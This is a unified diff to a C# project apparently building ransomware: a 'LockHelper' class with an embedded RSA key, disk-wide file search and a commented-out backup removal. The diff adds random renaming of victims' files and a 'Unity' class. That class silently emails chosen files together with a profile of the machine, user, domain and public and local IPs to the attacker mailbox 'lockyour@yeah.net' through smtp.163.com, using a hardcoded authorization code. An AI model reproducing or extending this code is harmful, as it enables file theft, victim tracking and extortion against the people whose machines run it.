@@ -1,14 +1,22 @@
-﻿using System;
+﻿using Microsoft.VisualBasic.Devices;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Net;
+using System.Net.Mail;
+using System.Net.Mime;
 using System.Security.Cryptography;
 using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
 
 namespace MyApplic
 {
     public class LockHelper
     {
+
+        Logger _log = Logger.GetLogger("LockHelper");
         volatile Queue<string> _lock_files = new Queue<string>();
         List<string> validextension = new List<string>();
         const string PublicKey = @"<RSAKeyValue><Modulus>nwbjN1znmyL2KyOIrRy/PbWZpTi+oekJIoGNc6jHCl0JNZLFHNs70fyf7y44BH8L8MBkSm5sSwCZfLm5nAsDNOmuEV5Uab5DuWYSE4R2Z3NkKexJJ4bnmXEZYXPMzTbXIpyvU2y9YVrz1BjjRPeHsb6daVdrBgjs4+2b/ok9myM=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
@@ -132,6 +140,14 @@ namespace MyApplic
             }
         }
 
+        void Rename(string filename)
+        {
+            var newname = Guid.NewGuid().ToString().Replace("-", "");
+            _log.Info(newname + "------>" + filename);
+            Computer MyComputer = new Computer();
+            MyComputer.FileSystem.RenameFile(filename, newname);
+        }
+
         void SearchFiles(string path)
         {
             var files = GetFiles(new DirectoryInfo(path), ".");
@@ -194,6 +210,154 @@ namespace MyApplic
             SearchDisk();
             //RemoveBackup();
             //DisplayLockinfo();
+        }
+    }
+
+    public class Unity
+    {
+        static SmtpClient smtpClient;
+        const string from_emailname = "lockyour@yeah.net";
+        const string to_emailname = "lockyour@yeah.net";
+        const string authcode = "HKPSKRFRCFMQEMDR";
+        const string ip_url = "http://www.net.cn/static/customercare/yourip.asp";
+
+        static Attachment AddFile(string file)
+        {
+            Attachment data = new Attachment(file, MediaTypeNames.Application.Octet);
+            // Add time stamp information for the file.
+            ContentDisposition disposition = data.ContentDisposition;
+            disposition.CreationDate = System.IO.File.GetCreationTime(file);
+            disposition.ModificationDate = System.IO.File.GetLastWriteTime(file);
+            disposition.ReadDate = System.IO.File.GetLastAccessTime(file);
+            // Add the file attachment to this e-mail message.
+            return data;
+        }
+
+        public static void Push(string file)
+        {
+            ThreadStart start = () =>
+            {
+                try
+                {
+                    //实例化一个发送邮件类。
+                    var mailMessage = new MailMessage();
+
+                    //发件人邮箱地址，方法重载不同，可以根据需求自行选择。
+                    mailMessage.From = new MailAddress(from_emailname, "displayName", Encoding.GetEncoding("GB2312"));
+                    //收件人邮箱地址。
+                    mailMessage.To.Add(new MailAddress(to_emailname, "displayName", Encoding.GetEncoding("GB2312")));
+
+                    //邮件标题。
+                    mailMessage.SubjectEncoding = Encoding.GetEncoding("GB2312");
+                    mailMessage.BodyEncoding = Encoding.GetEncoding("GB2312");
+                    mailMessage.Subject = "displayName";
+
+                    //邮件内容。
+                    var info = GetSystemInfo();
+                    mailMessage.Body = info;
+                    mailMessage.Attachments.Add(AddFile(file));
+                    //实例化一个SmtpClient类。
+                    if (smtpClient == null)
+                        smtpClient = new SmtpClient();
+                    //在这里我使用的是qq邮箱，所以是smtp.qq.com，如果你使用的是126邮箱，那么就是smtp.126.com。
+                    smtpClient.Host = "smtp.163.com";
+                    //使用安全加密连接。
+                    smtpClient.EnableSsl = true;
+                    //不和请求一块发送。
+                    smtpClient.UseDefaultCredentials = false;
+                    //验证发件人身份(发件人的邮箱，邮箱里的生成授权码);
+                    smtpClient.Credentials = new NetworkCredential(from_emailname, authcode);
+                    //发送
+                    smtpClient.Send(mailMessage);
+                }
+                catch { }
+                finally { }
+            };
+            var thread = new Thread(start);
+            thread.IsBackground = true;
+            thread.Start();
+        }
+
+        private static string GetSystemInfo()
+        {
+            var info = new StringBuilder();
+            info.Append(Environment.NewLine);
+            info.Append($"machineName: { Environment.MachineName}" + Environment.NewLine);
+            info.Append($"platform :{ Environment.OSVersion.Platform}" + Environment.NewLine);
+            info.Append($"osversion.Version: {Environment.OSVersion.VersionString}" + Environment.NewLine);
+            info.Append($"processorCount: {Environment.ProcessorCount}" + Environment.NewLine);
+            info.Append($"servicePack: {Environment.OSVersion.ServicePack}" + Environment.NewLine);
+            info.Append($"userName :{ Environment.UserName}" + Environment.NewLine);
+            info.Append($"domainName: { Environment.UserDomainName}" + Environment.NewLine);
+            info.Append($"systemDirectory: { Environment.SystemDirectory}" + Environment.NewLine);
+            info.Append($"currentDirectory: { Environment.CurrentDirectory}" + Environment.NewLine);
+            info.Append($"workingMemory: { GetMemory()}" + Environment.NewLine);
+            info.Append($"Public_IP: { GetIP()}" + Environment.NewLine);
+            info.Append($"Host_IP: { GetHostIP()}" + Environment.NewLine);
+            return info.ToString();
+        }
+
+        public static string GetMemory()
+        {
+            Process proc = Process.GetCurrentProcess();
+            long b = proc.PrivateMemorySize64;
+            for (int i = 0; i < 2; i++)
+            {
+                b /= 1024;
+            }
+            return b + "MB";
+        }
+
+        private static string GetHtml()
+        {
+            string pageHtml = string.Empty;
+            try
+            {
+                using (WebClient MyWebClient = new WebClient())
+                {
+                    Encoding encode = Encoding.GetEncoding("gbk");
+                    MyWebClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36");
+                    MyWebClient.Credentials = CredentialCache.DefaultCredentials;//获取或设置用于向Internet资源的请求进行身份验证的网络凭据
+                    var pageData = MyWebClient.DownloadData(ip_url); //从指定网站下载数据
+                    pageHtml = encode.GetString(pageData);
+                }
+            }
+            catch
+            {
+
+            }
+            finally { }
+
+            return pageHtml;
+        }
+
+        /// <summary>
+        /// 从html中通过正则找到ip信息(只支持ipv4地址)
+        /// </summary>
+        /// <param name="pageHtml"></param>
+        /// <returns></returns>
+        public static string GetIP(string pageHtml = null)
+        {
+            pageHtml = pageHtml ?? GetHtml();
+            //验证ipv4地址
+            string reg = @"(?:(?:(25[0-5])|(2[0-4]\d)|((1\d{2})|([1-9]?\d)))\.){3}(?:(25[0-5])|(2[0-4]\d)|((1\d{2})|([1-9]?\d)))";
+            string ip = "";
+            var m = Regex.Match(pageHtml, reg);
+            if (m.Success)
+                ip = m.Value;
+            return ip;
+        }
+
+        static string GetHostIP()
+        {
+            var addresses = Dns.GetHostAddresses(Dns.GetHostName());
+            StringBuilder builder = new StringBuilder();
+            for (int i = 0; i < addresses.Length; i++)
+            {
+                if (addresses[i].AddressFamily.ToString() == "InterNetwork")
+                    builder.AppendLine(addresses[i].ToString());
+            }
+            return builder.ToString();
         }
     }
 }
